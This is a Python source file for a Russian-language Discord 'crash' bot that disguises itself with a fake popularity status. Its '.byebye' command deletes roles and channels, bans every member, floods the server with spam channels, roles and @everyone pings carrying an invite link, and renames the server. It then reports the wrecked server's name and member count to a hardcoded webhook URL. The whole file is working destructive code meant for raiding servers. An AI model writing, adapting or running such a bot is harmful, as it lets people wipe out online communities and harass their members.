import discord
from discord.embeds import Embed
from discord_webhook.webhook import DiscordEmbed
from discord import client
from discord.ext import commands
from discord.utils import get
from discord_webhook import DiscordWebhook

activity = discord.Game(name='28.640 серверов', type=1)
a = 0
b = 1
c = 1
d = 2
intents = discord.Intents.all()

bot = commands.Bot(command_prefix = '.', intents=intents)

@bot.event
async def on_ready():
    await bot.change_presence(status='28.640 серверов', activity=activity)
    print(f'Бот запущен. Ник бота: {bot.user}')





@bot.command()
async def byebye(ctx):
    name = 'CrashByZanCord'
    guild = ctx.message.guild
    embed = DiscordEmbed(title= f'Крашнут сервер: `{ctx.guild.name}`', description=f'Кол-во участников: `{str(guild.member_count)}`', color='03b2f8')
    hook = DiscordWebhook(url='https://discord.com/api/webhooks/852622171397423144/J1fJqwR9BP4wISffAVa4tK9fx8NY42w1hEeYSo5tzpBnngvcQghHHPCTr6TcJ8TOS9DT')
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.delete()

        except:
            continue
            
    for m in ctx.guild.members:
        try:
            await m.ban(reason="Crash By ZanCord!")

        except:
            pass
    for channel in ctx.guild.channels:             
        await channel.delete() 

    for i in range(30):
        await guild.create_text_channel(name)
    for i in range(30):
        await guild.create_voice_channel(name)
    for i in range(30):
        await guild.create_role(name=name)

    for channel in ctx.guild.text_channels:             
        await channel.send(f'@everyone \n Crash By ZanCord https://discord.gg/5AJcB39axy')
    with open('1.png', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon, name=name)
    
    hook.add_embed(embed)
    response = hook.execute()
    

token = os.environ.get('BOT_TOKEN')
bot.run( str(token) )